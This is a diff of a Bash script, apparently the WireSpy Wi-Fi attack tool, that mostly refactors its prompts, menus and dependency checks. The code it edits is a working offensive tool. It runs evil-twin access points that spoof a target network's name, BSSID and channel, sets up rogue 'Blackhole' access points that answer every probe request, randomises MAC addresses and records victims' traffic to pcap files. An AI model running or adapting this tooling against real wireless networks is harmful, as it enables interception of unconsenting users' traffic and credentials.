@@ -18,35 +18,37 @@
 # * select the interface using the cursors rather than typing the name
 # * add option set colors on/off
 
-declare -gr SCRIPT_VERSION=0.5
-declare -gr BRANCH='dev'
+declare -r  PROGNAME=$(basename $0)
+declare -r  PROGBASENAME=${PROGNAME%%.*}
+declare -gr PROGVERSION=0.5
+declare -gr BRANCH='master'
 
-BOLD='\e[1m'
-DIM='\e[2m'
-RESET_ALL='\e[0m'
-RESET_BOLD='\e[21m'
-RESET_FG='\e[39m'
-UNDERLINED='\e[4m'
+# BOLD='\e[1m'
+# DIM='\e[2m'
+# RESET_ALL='\e[0m'
+# RESET_BOLD='\e[21m'
+# RESET_FG='\e[39m'
+# UNDERLINED='\e[4m'
 
-FG_BLACK='\e[30m'
-FG_CYAN='\e[36m'
-FG_GREEN='\e[32m'
-FG_YELLOW='\e[33m'
-FG_WHITE='\e[97m'
+# FG_BLACK='\e[30m'
+# FG_CYAN='\e[36m'
+# FG_GREEN='\e[32m'
+# FG_YELLOW='\e[33m'
+# FG_WHITE='\e[97m'
 
-BG_BLUE='\e[44m'
-BG_CYAN='\e[46m'
-BG_DARKGREY='\e[100m'
-BG_GREEN='\e[42m'
-BG_RED='\e[41m'
-BG_YELLOW='\e[43m'
+# BG_BLUE='\e[44m'
+# BG_CYAN='\e[46m'
+# BG_DARKGREY='\e[100m'
+# BG_GREEN='\e[42m'
+# BG_RED='\e[41m'
+# BG_YELLOW='\e[43m'
 
-declare -g  PROMPT_WIRESPY="${BG_GREEN}${FG_WHITE}wirespy$RESET_ALL »"
-declare -gr PROMPT_EVILTWIN="${BG_GREEN}${FG_WHITE}wirespy$FG_BLACK > eviltwin$RESET_ALL »"
-declare -gr PROMPT_HONEYPOT="${BG_GREEN}${FG_WHITE}wirespy$FG_BLACK > honeypot$RESET_ALL »"
-declare -gr PROMPT_POWERUP="${BG_GREEN}${FG_WHITE}wirespy$FG_BLACK > powerup$RESET_ALL »"
+declare -g  PROMPT_WIRESPY="$PROGBASENAME »"
+declare -gr PROMPT_EVILTWIN="$PROGBASENAME > eviltwin »"
+declare -gr PROMPT_HONEYPOT="$PROGBASENAME > honeypot »"
+declare -gr PROMPT_POWERUP="$PROGBASENAME > powerup »"
 
-isHonneypot=0
+isHoneypot=0
 isEviltwin=0
 isSniffing=0
 
@@ -70,7 +72,7 @@ The final step is to deauthenticate all the clients from the target access point
 to the evil twin."""
 
 declare -a INTERFACES
-declare -a required_packages=(
+declare -a REQUIRED_PACKAGES=(
     'aircrack-ng'
     'git'
     'grep'
@@ -87,31 +89,36 @@ declare -a WINTERFACES
 
 trap quit INT
 
-print_wirespy()     { echo -e "$PROMPT_WIRESPY $1"; }
-print_error()       { echo -e "${BG_GREEN}${FG_WHITE}wirespy$FG_BLACK > error$RESET_ALL » $1"; }
-print_info()        { echo -e "${BG_GREEN}${FG_WHITE}wirespy$FG_BLACK > info$RESET_ALL » $1"; }
-print_intf()        { echo -e "${BG_GREEN}${FG_WHITE}wirespy$FG_BLACK > intf$RESET_ALL » $1"; }
-print_active()      { echo -e "${BG_GREEN}${FG_WHITE}wirespy$FG_BLACK > active$RESET_ALL » $1"; }
-print_warning()     { echo -e "${BG_GREEN}${FG_WHITE}wirespy$FG_BLACK > warning$RESET_ALL » $1"; }
-print_honeypot()    { echo -e "$PROMPT_HONEYPOT $1"; }
-print_eviltwin()    { echo -e "$PROMPT_EVILTWIN $1"; }
-print_powerup()     { echo -e "$PROMPT_POWERUP $1"; }
+print()         { printf "%s » %s\n" "$PROGBASENAME" "$1"; }
+print_error()   { printf "%s > error » %s\n" "$PROGBASENAME" "$1"; }
+print_info()    { printf "%s > info » %s\n" "$PROGBASENAME" "$1"; }
+print_intf()    { printf "%s > interface » %s\n" "$PROGBASENAME" "$1"; }
+print_status()  { printf "%s > status » %s\n" "$PROGBASENAME" "$1"; }
+print_warning() { printf "%s > warning » %s\n" "$PROGBASENAME" "$1"; }
+print_hp()      { printf "%s > honeypot » %s\n" "$PROGBASENAME" "$1"; }
+print_et()      { printf "%s > eviltwin » %s\n" "$PROGBASENAME" "$1"; }
+print_pu()      { printf "%s > powerup » %s\n" "$PROGBASENAME" "$1"; }
 
 
 function banner() {
-    echo -e "${BOLD}WireSpy v$SCRIPT_VERSION${RESET_ALL} (type '${BOLD}help${RESET_ALL}' for a list of commands)"
-    echo -e "${UNDERLINED}${DIM}Author: Alexandre Teyar | LinkedIn: linkedin.com/in/alexandre-teyar | GitHub: github.com/AresS31\n$RESET_ALL"
+cat <<- BANNER
+${PROGBASENAME^^} v$PROGVERSION (type 'help' for a list of commands)
+Author: Alexandre Teyar | LinkedIn: linkedin.com/in/alexandre-teyar | GitHub: github.com/AresS31
+
+BANNER
 }
 
 
 function check_update() {
-    print_wirespy 'Checking for an update...'
+    print 'Checking for an update...'
 
-    if [[ $(git rev-parse --is-inside-work-tree 2> /dev/null) ]]; then
-        if [[ $(git diff --name-only origin/$BRANCH -- ${0}) ]]; then
-            print_wirespy 'A new version is available, consider updating using the command: git reset --hard && git pull origin $BRANCH --rebase'
+    if [[ $(git rev-parse --is-inside-work-tree 2> /dev/null) ]]
+    then
+        if [[ $(git diff --name-only origin/$BRANCH -- ${0}) ]]
+        then
+            print 'A new version is available, consider updating using the command: git reset --hard && git pull origin $BRANCH --rebase'
         else
-            print_wirespy 'This is the latest stable version'
+            print 'This is the latest stable version'
         fi
     else
         print_warning "It is recommended to fetch $0 on GitHub using the command: git clone https://github.com/AresS31/wirespy"
@@ -119,52 +126,89 @@ function check_update() {
 }
 
 
-function check_compatibility() {
-    print_wirespy 'Checking for dependencies...'
 
-    for package in "${required_packages[@]}"; do
-        if [[ $(dpkg -s $package 2> /dev/null) ]]; then
+function check_compatibility() {
+    local -i var=0
+    
+    print 'Bash version check...'
+    if ((BASH_VERSINFO[0] < 4))
+    then 
+        var=1
+        print_error "A minimum of bash version 4.0 is required. Upgrade your version with: sudo apt-get install --only-upgrade bash"
+    else
+        print 'The bash minimum version requirement is satisfied'
+    fi
+
+    print 'Dependencies check...'
+    for package in ${REQUIRED_PACKAGES[@]}
+    do
+        if [[ -n $(dpkg -s $package 2> /dev/null) ]]
+        then
             continue
         else
-            print_error "The $package package is missing, install it using the command: sudo apt-get install $package -y"
-            exit 1
+            var=1
+            print_error "The $package package is missing. Install it with: sudo apt-get install $package -y"
         fi
     done
 
-    print_wirespy 'All the required packages are already installed'
+    if [[ $var = 1 ]]
+    then
+        exit 1
+    fi
+
+    print 'All of the required packages are already installed'
 }
 
+function usage {
 
-function help {
-    echo -e """${FG_GREEN}run eviltwin$RESET_FG  : launch an evil-twin attack
-${FG_GREEN}run honeypot$RESET_FG  : launch a rogue access point
-${FG_GREEN}run powerup$RESET_FG   : run powerup wireless interface
-${FG_GREEN}show leases$RESET_FG   : display the DHCP leases
-${FG_GREEN}start capture$RESET_FG : start packet capture
-${FG_GREEN}stop capture$RESET_FG  : stop packet capture
-${FG_GREEN}active$RESET_FG        : show information about active modules
-${FG_GREEN}clear$RESET_FG         : clear the screen
-${FG_GREEN}help$RESET_FG          : list available commands
-${FG_GREEN}quit$RESET_FG          : exit the script gracefully"""
+cat <<- USAGE
+Modules:
+    eviltwin      > launch an evil-twin attack
+    honeypot      > launch a rogue access point attack
+    powerup       > power wireless interface up
+    leases        > display DHCP leases
+    start capture > start packet capture (tcpdump)
+    stop capture  > stop packet capture (tcpdump)
+Commands:
+    status        > show modules status
+    clear         > clear the terminal
+    help          > list available commands
+    quit          > exit the program
+USAGE
 }
 
 
 function menu() {
-    while :; do
+    while :
+    do
         PROMPT=$PROMPT_WIRESPY
         read -p  "$(echo -e $PROMPT) "
 
         case $REPLY in
-            'active')
-                if [[ $isHonneypot = 1 ]]; then
-                    print_active "honeypot is running..."
+            'status')
+                local honeypot_status='not running'
+                local eviltwin_status='not running'
+                local tcpdump_status='not running'
+
+                if [[ $isEviltwin = 1 ]]
+                then
+                    eviltwin_status='running'
                 fi
-                if [[ $isEviltwin = 1 ]]; then
-                    print_active "eviltwin is running..."
+                if [[ $isHoneypot = 1 ]]
+                then
+                    honeypot_status='running'
                 fi
-                if [[ $isSniffing = 1 ]]; then
-                    print_active "packet capture is running..."
+                if [[ $isSniffing = 1 ]]
+                then
+                    tcpdump_status='running'
                 fi
+
+cat <<- STATUS
+Modules status:
+    eviltwin       > $eviltwin_status
+    honeypot       > $honeypot_status
+    packet capture > $tcpdump_status
+STATUS
                 ;;
             'clear')
                 clear
@@ -173,31 +217,32 @@ function menu() {
                 quit
                 ;;
             'help')
-                help
+                usage
                 ;;
-            'run eviltwin')
+            'eviltwin')
                 PROMPT=$PROMPT_EVILTWIN
 
-                if [[ $isHoneypot = 1 || $isEviltwin = 1 ]]; then
+                if [[ $isHoneypot = 1 || $isEviltwin = 1 ]]
+                then
                     print_warning "An access-point (honeypot || evil-twin) is currently running. Do you wish to stop it to start an evil-twin attack?"
-                    while :; do
-                        read -p  "$(echo -e $PROMPT) " 
-
-                        case $REPLY in
-                            'y'|'ye'|'yes')
+                    select option in 'yes' 'no' 'quit'
+                    do
+                        case $option in
+                            'yes') 
                                 print_info "Stopping the running attack..."
                                 clean_up &> /dev/null
                                 configure_intfs
                                 eviltwin
-                                isHonneypot=0
+                                isHoneypot=0
                                 isEviltwin=1
                                 break
                                 ;;
-                            'n'|'no')
+                            'no')
                                 break
                                 ;;
-                            *)
-                                print_warning "Invalid choice: ${FG_GREEN}${BOLD}${REPLY}$RESET_ALL"
+                            'quit')
+                                exit 0
+                                ;;
                         esac
                     done
                 else
@@ -206,47 +251,49 @@ function menu() {
                     isEviltwin=1
                 fi
                 ;;
-            'run honeypot')
+            'honeypot')
                 PROMPT=$PROMPT_HONEYPOT
 
-                if [[ $isHoneypot -eq 1 || $isEviltwin -eq 1 ]]; then
+                if [[ $isHoneypot = 1 || $isEviltwin = 1 ]]
+                then
                     print_warning "An access-point (honeypot || evil-twin) is currently running. Do you wish to stop it to start an evil-twin attack?"
-                    while :; do
-                        read -p  "$(echo -e $PROMPT) " 
-
-                        case $REPLY in
-                            'y'|'ye'|'yes')
+                    select option in 'yes' 'no' 'quit'
+                    do
+                        case $option in
+                            'yes') 
                                 print_info "Stopping the running attack..."
                                 clean_up &> /dev/null
                                 configure_intfs
                                 honeypot
-                                isHonneypot=1
+                                isHoneypot=1
                                 isEviltwin=0
                                 break
                                 ;;
-                            'n'|'no')
+                            'no')
                                 break
                                 ;;
-                            *)
-                                print_warning "Invalid choice: ${FG_GREEN}${BOLD}${REPLY}$RESET_ALL"
+                            'quit')
+                                exit 0
+                                ;;
                         esac
                     done
                 else
-                    echo "yo honey $isHonneypot evil $isEviltwin"
                     configure_intfs
                     honeypot
-                    isHonneypot=1
+                    isHoneypot=1
                 fi
                 ;;
-            'run powerup')
+            'powerup')
                 PROMPT=$PROMPT_POWERUP
                 powerup
                 ;;
-            'show lease'|'show leases')
-                if [[ $isHonneypot = 0 && $isEviltwin = 0 ]]; then
+            'lease'|'leases')
+                if [[ $isHoneypot = 0 && $isEviltwin = 0 ]]
+                then
                     print_warning "$AP_PREREQUISITE"
                 else
-                    if [[ $(cat /var/run/dhcpd.pid) ]]; then
+                    if [[ $(cat /var/run/dhcpd.pid) ]]
+                    then
                         cat /var/lib/dhcp/dhcpd.leases
                     else
                         print_warning 'The DHCP server has not been started'
@@ -254,10 +301,12 @@ function menu() {
                 fi
                 ;;
             'start capture')
-                if [[ $isHonneypot = 0 && $isEviltwin = 0 ]]; then
+                if [[ $isHoneypot = 0 && $isEviltwin = 0 ]]
+                then
                     print_warning "$AP_PREREQUISITE"
                 else
-                    if [[ $isSniffing = 0 ]]; then
+                    if [[ $isSniffing = 0 ]]
+                    then
                         print_info "Packet capture started, the resulting file will be ./logs/capture_$(/bin/date +"%Y%m%d-%H%M%S").pcap"
                         TCPDUMP_PID=$(tcpdump -i $TINTF -w ./logs/capture_$(/bin/date +"%Y%m%d-%H%M%S").pcap &> /dev/null & echo $!)
                         isSniffing=1
@@ -267,10 +316,12 @@ function menu() {
                 fi
                 ;;
             'stop capture')
-                if [[ $isHonneypot = 0 && $isEviltwin = 0 ]]; then
+                if [[ $isHoneypot = 0 && $isEviltwin = 0 ]]
+                then
                     print_warning "$AP_PREREQUISITE"
                 else
-                    if [[ $isSniffing = 1 ]]; then
+                    if [[ $isSniffing = 1 ]]
+                    then
                         print_info "Packet capture stopped"
                         kill -SIGKILL "$TCPDUMP_PID"
                         isSniffing=0
@@ -280,7 +331,7 @@ function menu() {
                 fi
                 ;;
             *)
-                print_warning "Invalid command: ${FG_GREEN}${BOLD}${REPLY}$RESET_ALL - type ${BOLD}help$RESET_ALL for the list of available commands"
+                print_warning "Invalid command: ${REPLY}. Type help for the list of available commands"
                 ;;
         esac
     done
@@ -288,54 +339,67 @@ function menu() {
 
 
 function configure_intfs() {
-    local PS3="$(echo -e $PROMPT) "
+    local -r PS3="$(echo -e $PROMPT) "
 
-    print_wirespy 'Select the Internet-facing interface:'
+    print 'Select the Internet-facing interface:'
     get_intfs
-    select option in "${INTERFACES[@]}"
+    select option in "${INTERFACES[@]}" 'quit'
     do
-        if [[ -n $option ]]; then
-            INTF=$(echo "$option" | awk -F': ' '{print $1}')
-            break
-        else
-            print_warning "Invalid option: ${FG_GREEN}${BOLD}${REPLY}$RESET_ALL"
-        fi
+        case $option in
+          'quit')
+                exit 0
+                ;;
+            *)
+                if [[ -n $option ]]
+                then
+                    INTF=$(echo "$option" | awk -F': ' '{print $1}')
+                    break
+                fi
+                ;;
+        esac
     done
 
-    print_wirespy "Do you wish to randomise $INTF MAC address (this option can cause problems)?"
-    while :; do
-        read -p  "$(echo -e $PROMPT) " 
-
-        case $REPLY in
-            'y'|'ye'|'yes')
+    print "Do you wish to randomise $INTF MAC address (this option can cause problems)?"
+    select option in 'yes' 'no' 'quit'
+    do
+        case $option in
+            'yes') 
                 print_info "Randomising $INTF MAC address..."
                 ip link set $INTF down && macchanger -A $INTF && ip link set $INTF up
                 print_warning 'In case of problems, RESTART networking (/etc/init.d/network restart), or use wicd (wicd-client)'
                 break
                 ;;
-            'n'|'no')
+            'no') 
                 break
                 ;;
-            *)
-                print_warning "Invalid choice: ${FG_GREEN}${BOLD}${REPLY}$RESET_ALL"
+            'quit')
+                exit 0
+                ;;
         esac
     done
 
-    print_wirespy 'Select the wireless interface to use:'
+    print 'Select the wireless interface to use:'
     get_wintfs
-    select option in "${WINTERFACES[@]}"
+    select option in "${WINTERFACES[@]}" 'quit'
     do
-        if [[ -n $option ]]; then
-            WINTF=$(echo "$option" | awk -F': ' '{print $1}')
+        case $option in
+            'quit')
+                exit 0
+                ;;
+            *)
+                if [[ -n $option ]]
+                then
+                    WINTF=$(echo "$option" | awk -F': ' '{print $1}')
 
-            if [[ $WINTF = $INTF ]]; then
-                print_warning "$WINTF is already in use, select another interface"
-            else
-                break
-            fi
-        else
-            print_warning "Invalid option: ${FG_GREEN}${BOLD}${REPLY}$RESET_ALL"
-        fi
+                    if [[ $WINTF = $INTF ]]
+                    then
+                        print_warning "$WINTF is already in use, select another interface"
+                    else
+                        break
+                    fi
+                fi
+                ;;
+        esac
     done
 
     # prevent wlan adapter soft blocking
@@ -347,7 +411,8 @@ function configure_intfs() {
     iw dev $WINTF set type monitor
     sleep 2     # crucial to let WINTF come up before macchanging
 
-    if [[ $? = 0 ]]; then
+    if [[ $? = 0 ]]
+    then
         print_info "Monitor mode started"
     else
         print_error "$WINTF could not enter monitor mode, inspect this issue manually"
@@ -355,21 +420,21 @@ function configure_intfs() {
     fi
     MINTF=$WINTF
 
-    print_wirespy "Do you wish to randomise $MINTF MAC address (this option is recommended)?"
-    while :; do
-        read -p  "$(echo -e $PROMPT) " 
-
-        case $REPLY in
-            'y'|'ye'|'yes')
+    print "Do you wish to randomise $MINTF MAC address (this option is recommended)?"
+    select option in 'yes' 'no' 'quit'
+    do
+        case $option in
+            'yes') 
                 print_info "Randomising $MINTF MAC address..."
                 ip link set $MINTF down && macchanger -A $MINTF && ip link set $MINTF up
                 break
                 ;;
-            'n'|'no')
+            'no')
                 break
                 ;;
-            *)
-                print_warning "Invalid choice: ${FG_GREEN}${BOLD}${REPLY}$RESET_ALL"
+            'quit')
+                exit 0
+                ;;
         esac
     done
 
@@ -379,37 +444,35 @@ function configure_intfs() {
 
 
 function honeypot() {
-    local options=(
+    local -ar options=(
         "Blackhole: The access point type will respond to all probe requests (the access point may receive a lot \
 of requests in areas with high levels of WiFi activity such as crowded public places)." 
         'Bullzeye: The access point type will respond only to the probe requests specifying the access point ESSID.'
         )
-    local PS3="$(echo -e $PROMPT) "
+    local -r PS3="$(echo -e $PROMPT) "
 
 
-    print_honeypot 'Select the type of honeypot you want to set up:'
+    print_hp 'Select the type of honeypot you want to set up:'
     select option in "${options[@]}"
     do
         case $REPLY in
             1) 
-            local -i attack_type=1
-            break 
-            ;;
+                local -ir attack_type=1
+                break
+                ;;
             2) 
-            local -i attack_type=2
-            break 
-            ;;
-            *)
-            print_warning "Invalid option: ${FG_GREEN}${BOLD}${REPLY}$RESET_ALL"
-            ;;
+                local -ir attack_type=2
+                break
+                ;;
         esac
     done
 
-    print_honeypot 'Enter the honeypot ESSID:'
+    print_hp 'Enter the honeypot ESSID:'
     read -p "$(echo -e $PROMPT) " ESSID
 
-    print_honeypot 'Enter the honeypot wireless channel (value must be between 1 and 12):'
-    while :; do
+    print_hp 'Enter the honeypot wireless channel (value must be between 1 and 12):'
+    while :
+    do
         read -p  "$(echo -e $PROMPT) "
         
         case $REPLY in 
@@ -418,64 +481,63 @@ of requests in areas with high levels of WiFi activity such as crowded public pl
                 break
                 ;;
             *) 
-                print_warning "Invalid channel: ${FG_GREEN}${BOLD}${REPLY}$RESET_ALL"
+                print_warning "Invalid channel: $REPLY"
                 ;;
         esac
     done
 
-    print_honeypot 'Do you want to enable WEP authentication?'
-    while :; do
-        read -p  "$(echo -e $PROMPT) "
-        
-        case $REPLY in
-            'y'|'ye'|'yes')
-                print_honeypot 'Enter a WEP password (the value must be 10 hexadecimal characters):'
+    print_hp 'Do you want to enable WEP authentication?'
+    select option in 'yes' 'no' 'quit'
+    do
+        case $option in
+            'yes') 
+                print_hp 'Enter a WEP password (the value must be 10 hexadecimal characters):'
                 read -p "$(echo -e $PROMPT) " WEP 
 
                 case $attack_type in
                     1)
                         xterm -fg green -title "Blackhole - $ESSID" -e "airbase-ng -w $WEP -c $WCHAN -e $ESSID -P -C 60 $MINTF -v | tee ./conf/tmp.txt 2> /dev/null" &
                         XTERM_AIRBASE_PID=$!
-                        break
                         ;;
                     2)
                         xterm -fg green -title "Bullzeye - $ESSID" -e "airbase-ng -w $WEP -c $WCHAN -e $ESSID $MINTF -v | tee ./conf/tmp.txt 2> /dev/null" &
                         XTERM_AIRBASE_PID=$!
-                        break
-                        ;;    
+                        ;;
                 esac
+                break
                 ;;
-            'n'|'no')
+            'no') 
                 case $attack_type in
                     1)
                         xterm -fg green -title "Blackhole - $ESSID" -e "airbase-ng -c $WCHAN -e $ESSID -P $MINTF -v | tee ./conf/tmp.txt 2> /dev/null" &
                         XTERM_AIRBASE_PID=$!
-                        break
                         ;;
                     2)
                         xterm -fg green -title "Bullzeye - $ESSID" -e "airbase-ng -c $WCHAN -e $ESSID $MINTF -v | tee ./conf/tmp.txt 2> /dev/null" &
                         XTERM_AIRBASE_PID=$!
-                        break
                         ;;  
                 esac
+                break
                 ;;
-            *)
-                print_warning "Invalid choice: ${FG_GREEN}${BOLD}${REPLY}$RESET_ALL"
+            'quit')
+                exit 0
                 ;;
         esac
     done
+
     sleep 4     # crucial, to let TINTF come up before setting it up  
 
     # extracting the tap interface
     TINTF=$(grep 'Created tap interface' ./conf/tmp.txt | awk '{print $5}')
-    if [[ $TINTF = '' ]]; then
+    if [[ $TINTF = '' ]]
+    then
         print_error "$AIRBASE_ERROR"
         quit
     fi
 
     enable_internet
     
-    print_info "The honeypot ${BOLD}${ESSID}$RESET_ALL is now running..."
+    print_info "The honeypot $ESSID is now running..."
     sleep 6
 }
 
@@ -483,14 +545,15 @@ of requests in areas with high levels of WiFi activity such as crowded public pl
 function eviltwin() {
     echo "$EVILTWIN_INFO"
 
-    print_eviltwin 'Enter the evil-twin ESSID (the value must be identical to the legitimate access-point to spoof):'
+    print_et 'Enter the evil-twin ESSID (the value must be identical to the legitimate access-point to spoof):'
     read -p "$(echo -e $PROMPT) " eviltwin_ESSID
 
-    print_eviltwin 'Enter the evil-twin BSSID (the value must be identical to the legitimate access-point to spoof):'
+    print_et 'Enter the evil-twin BSSID (the value must be identical to the legitimate access-point to spoof):'
     read -p "$(echo -e $PROMPT) " eviltwin_BSSID
 
-    print_eviltwin 'Enter the wireless channel to use (the value must be identical to the legitimate access-point to spoof):'
-    while :; do
+    print_et 'Enter the wireless channel to use (the value must be identical to the legitimate access-point to spoof):'
+    while :
+    do
         read -p  "$(echo -e $PROMPT) "
         
         case $REPLY in 
@@ -499,7 +562,7 @@ function eviltwin() {
                 break
                 ;;
             *) 
-                print_warning "Invalid channel: ${FG_GREEN}${BOLD}${REPLY}$RESET_ALL"
+                print_warning "Invalid channel: $REPLY"
                 ;;
         esac
     done
@@ -510,7 +573,8 @@ function eviltwin() {
 
     # extracting the tap interface
     TINTF=$(grep 'Created tap interface' ./conf/tmp.txt | awk '{print $5}')
-    if [[ $TINTF = '' ]]; then
+    if [[ $TINTF = '' ]]
+    then
         print_error "$AIRBASE_ERROR"
         quit
     fi
@@ -522,7 +586,7 @@ function eviltwin() {
 
     enable_internet
     
-    print_info "The eviltwin ${BOLD}${eviltwin_ESSID}$RESET_ALL is now running..."
+    print_info "The eviltwin $eviltwin_ESSID is now running..."
     sleep 6
 }
 
@@ -530,27 +594,35 @@ function eviltwin() {
 function powerup() {
     local PS3="$(echo -e $PROMPT) "
 
-    print_powerup 'Select the wireless interface to boost-up:'
+    print_pu 'Select the wireless interface to boost-up:'
     get_wintfs
     select option in "${WINTERFACES[@]}"
     do
-        if [[ -n $option ]]; then
-            local WINTF=$(echo "$option" | awk -F': ' '{print $1}')
-            break
-        else
-            print_warning "Invalid option: ${FG_GREEN}${BOLD}${REPLY}$RESET_ALL"
-        fi
+        case $option in
+            'quit')
+                exit 0
+                ;;
+            *)
+                if [[ -n $option ]]
+                then
+                    local WINTF=$(echo "$option" | awk -F': ' '{print $1}')
+                    break
+                fi
+                ;;
+        esac
     done
 
-    print_powerup "Enter the power boost (the value must be up to to 4000) to apply to ${WINTF}:"
-    while :; do
+    print_pu "Enter the power boost (the value must be up to to 4000) to apply to ${WINTF}:"
+    while :
+    do
         read -p  "$(echo -e $PROMPT_POWERUP) "
         
-        if [[ $REPLY -ge 0 ]] && [[ $REPLY -le 4000 ]]; then
+        if [[ $REPLY -ge 0 ]] && [[ $REPLY -le 4000 ]]
+        then
             local -i BOOST=$REPLY
             break
         else
-            print_warning "Invalid value: ${FG_GREEN}${BOLD}${REPLY}$RESET_ALL"
+            print_warning "Invalid value: $REPLY"
         fi
     done
 
@@ -565,10 +637,12 @@ function powerup() {
 function get_intfs() {
     intfs=$(ip -o link show | awk -F': ' '{print $2}' | grep -v 'lo')
 
-    if [[ $intfs ]]; then
+    if [[ $intfs ]]
+    then
         INTERFACES=()
 
-        for intf in $intfs; do # get the network interfaces names
+        for intf in $intfs
+        do # get the network interfaces names
             IP=$(ip -o -f inet add show "$intf" | awk '{print $4}')
             MAC=$(ip link show "$intf" | awk '/ether/ {print $2}')
             INTERFACES+=("${intf}: $IP $MAC")
@@ -583,10 +657,12 @@ function get_intfs() {
 function get_wintfs() {
     wintfs=$(ip -o link show | awk -F': ' '{print $2}' | grep 'wlan')
 
-    if [[ $wintfs ]]; then
+    if [[ $wintfs ]]
+    then
         WINTERFACES=()
 
-        for wintf in $wintfs; do # get the interfaces names
+        for wintf in $wintfs
+        do # get the interfaces names
             IP=$(ip -o -f inet add show "$wintf" | awk '{print $4}')
             MAC=$(ip link show "$wintf" | awk '/ether/ {print $2}')
             WINTERFACES+=("${wintf}: $IP $MAC")
@@ -638,12 +714,15 @@ function enable_internet() {
 
 
 function clean_up() {
-    if [[ $isHonneypot = 1 || $isEviltwin = 1 ]]; then
+    if [[ $isHoneypot = 1 || $isEviltwin = 1 ]]
+    then
         print_info "Terminating active processes..."
-        if [[ $XTERM_AIRBASE_PID ]]; then
+        if [[ $XTERM_AIRBASE_PID ]]
+        then
             kill -SIGKILL $XTERM_AIRBASE_PID 
         fi
-        if [[ $XTERM_AIREPLAY_PID ]]; then
+        if [[ $XTERM_AIREPLAY_PID ]]
+        then
             kill -SIGKILL $XTERM_AIREPLAY_PID
         fi
         sleep 2
@@ -667,18 +746,21 @@ function clean_up() {
         print_info 'Stopping DHCP server...'
         /etc/init.d/isc-dhcp-server stop
     fi
-    if [[ $MINTF != '' ]]; then
+    if [[ $MINTF != '' ]]
+    then
         print_info "Starting managed mode on $MINTF..." 
         iw dev $MINTF set type managed
         sleep 2
 
-        if [[ $? = 0 ]]; then
+        if [[ $? = 0 ]]
+        then
             print_info "Managed mode started"
         else
             print_error "$MINTF could not enter managed mode, inspect this issue manually"
         fi
     fi
-    if [[ $isSniffing = 1 ]]; then
+    if [[ $isSniffing = 1 ]]
+    then
         print_info "Terminating TCPDump..."
         kill -SIGKILL $TCPDUMP_PID
         sleep 4
@@ -688,13 +770,14 @@ function clean_up() {
 
 function quit() {
     clean_up
-    exit
+    exit 130
 }
 
 
 # ensure that the script is running with root privileges
 # this step is necessary since WireSpy needs to be perform network changes
-if [[ $EUID -ne 0 ]]; then
+if [[ $EUID -ne 0 ]]
+then
     print_error "You must run this script as as root using the command: sudo bash ${0}"
     exit 1
 fi
